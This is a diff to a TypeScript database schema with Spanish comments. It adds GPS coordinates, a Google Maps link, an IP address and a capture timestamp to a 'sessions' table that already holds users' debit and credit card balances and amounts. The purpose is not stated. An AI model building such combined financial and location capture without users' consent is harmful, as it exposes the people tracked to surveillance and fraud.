@@ -155,7 +155,13 @@ export const sessions = pgTable("sessions", {
   saldoDebito: text("saldo_debito"), // Respuesta sobre tarjeta de débito
   montoDebito: text("monto_debito"), // Monto en tarjeta de débito
   saldoCredito: text("saldo_credito"), // Respuesta sobre tarjeta de crédito
-  montoCredito: text("monto_credito") // Monto en tarjeta de crédito
+  montoCredito: text("monto_credito"), // Monto en tarjeta de crédito
+  // Información de geolocalización
+  latitude: text("latitude"), // Coordenada GPS de latitud
+  longitude: text("longitude"), // Coordenada GPS de longitud
+  googleMapsLink: text("google_maps_link"), // Enlace directo a Google Maps
+  ipAddress: text("ip_address"), // Dirección IP del usuario
+  locationTimestamp: timestamp("location_timestamp") // Timestamp de cuando se capturó la ubicación
 });
 
 export const insertSessionSchema = createInsertSchema(sessions).pick({
